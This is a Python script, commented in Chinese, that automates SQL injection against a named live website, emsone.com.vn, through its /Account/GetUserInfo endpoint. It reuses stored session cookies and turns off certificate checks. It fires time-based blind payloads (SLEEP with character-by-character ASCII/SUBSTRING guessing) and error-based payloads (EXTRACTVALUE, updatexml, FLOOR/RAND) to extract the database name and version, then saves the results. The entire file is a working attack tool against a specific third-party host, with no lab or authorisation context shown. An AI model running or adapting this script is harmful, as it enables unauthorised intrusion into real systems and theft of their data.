#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import re
import time
import urllib3
urllib3.disable_warnings()

class FinalSQLiVerification:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_time_based_accurate(self):
        """精确时间盲注测试"""
        print("[*] 精确时间盲注测试...")
        
        endpoint = '/Account/GetUserInfo'
        
        # 测试延迟
        normal_start = time.time()
        normal_r = self.session.get(f"{self.base_url}{endpoint}?id=1", timeout=15)
        normal_elapsed = time.time() - normal_start
        
        test_start = time.time()
        payload = "1' AND SLEEP(10)--"
        test_r = self.session.get(f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}", timeout=20)
        test_elapsed = time.time() - test_start
        
        print(f"    正常响应: {normal_elapsed:.2f}s")
        print(f"    SLEEP(10): {test_elapsed:.2f}s")
        
        if test_elapsed - normal_elapsed > 8:
            print(f"    [!] 时间盲注有效，延迟: {test_elapsed - normal_elapsed:.2f}s")
            return True
        else:
            print(f"    [-] 时间盲注无效")
            return False
    
    def extract_char_time_based(self, query, position):
        """时间盲注提取字符"""
        endpoint = '/Account/GetUserInfo'
        
        for i in range(32, 127):
            char = chr(i)
            if char in ["'", '"', '\\']:
                continue
            
            payload = f"1' AND IF(ASCII(SUBSTRING(({query}), {position}, 1))={i}, SLEEP(5), 0)--"
            url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
            
            start = time.time()
            try:
                self.session.get(url, timeout=10)
            except:
                pass
            elapsed = time.time() - start
            
            if elapsed >= 4:
                return char
        
        return None
    
    def extract_string_time_based(self, query, max_len=50):
        """时间盲注提取字符串"""
        result = ""
        
        for pos in range(1, max_len + 1):
            char = self.extract_char_time_based(query, pos)
            if char:
                result += char
                print(f"    位置 {pos}: {char} -> {result}")
            else:
                break
            time.sleep(0.5)
        
        return result if result else None
    
    def test_all_response_formats(self):
        """测试所有响应格式"""
        print("[*] 测试所有响应格式...")
        
        endpoint = '/Account/GetUserInfo'
        query = "SELECT database()"
        
        payloads = [
            f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--",
            f"1' AND updatexml(1, CONCAT(0x7e, ({query}), 0x7e), 1)--",
            f"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(({query}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ]
        
        for payload in payloads:
            url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
            r = self.session.get(url, timeout=10)
            
            # 保存响应
            filename = f"response_{hash(payload)}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(r.text)
            
            # 检查所有可能的提取位置
            print(f"\n[*] Payload: {payload[:50]}...")
            print(f"    响应长度: {len(r.text)}")
            
            # 检查XPATH错误
            if 'XPATH' in r.text.upper():
                print("    [+] 发现XPATH")
                patterns = [
                    r"XPATH syntax error: '~([^']+)~'",
                    r"'~([^']+)~'",
                    r"~([^~]+)~",
                ]
                for pattern in patterns:
                    match = re.search(pattern, r.text, re.IGNORECASE)
                    if match:
                        print(f"    [+] 提取值: {match.group(1)}")
                        return match.group(1)
            
            # 检查HTML注释
            comments = re.findall(r'<!--.*?-->', r.text, re.DOTALL)
            for comment in comments:
                if '~' in comment:
                    match = re.search(r'~([^~]+)~', comment)
                    if match:
                        print(f"    [+] 注释中提取: {match.group(1)}")
                        return match.group(1)
        
        return None
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("最终SQL注入验证")
        print("="*60)
        
        # 1. 测试时间盲注
        time_based_works = self.test_time_based_accurate()
        
        # 2. 测试所有响应格式
        db_name = self.test_all_response_formats()
        if db_name:
            self.db_info['database'] = db_name
        
        # 3. 如果时间盲注有效，提取数据
        if time_based_works:
            print("\n[*] 时间盲注有效，开始提取数据...")
            version = self.extract_string_time_based("SELECT version()", max_len=50)
            if version:
                self.db_info['version'] = version
            
            db_name = self.extract_string_time_based("SELECT database()", max_len=50)
            if db_name:
                self.db_info['database'] = db_name
        
        # 保存结果
        with open('final_sqli_verified.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("最终结果")
        print("="*60)
        for k, v in self.db_info.items():
            print(f"{k}: {v}")
        
        return self.db_info

if __name__ == "__main__":
    verifier = FinalSQLiVerification()
    verifier.run_all()